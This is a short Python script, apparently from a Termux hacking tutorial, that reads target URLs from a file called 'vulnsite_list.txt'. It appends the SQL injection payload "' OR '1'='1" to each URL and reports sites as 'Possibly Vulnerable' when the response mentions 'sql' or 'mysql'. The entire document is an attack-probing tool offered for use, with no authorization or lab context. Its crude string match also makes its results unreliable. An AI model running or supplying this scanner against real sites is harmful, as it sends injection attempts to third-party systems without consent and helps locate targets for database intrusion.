#!/usr/bin/env python3

import requests

def test_sql_injection(url):
    payload = "' OR '1'='1"
    try:
        full_url = url + payload
        response = requests.get(full_url)
        if "sql" in response.text.lower() or "mysql" in response.text.lower():
            print(f"[+] Possibly Vulnerable: {url}")
        else:
            print(f"[-] Not Vulnerable: {url}")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    print("💉 SQL Injection Vulnerability Scanner")
    with open("vulnsite_list.txt", "r") as f:
        for line in f:
            test_sql_injection(line.strip())SQL injection Termux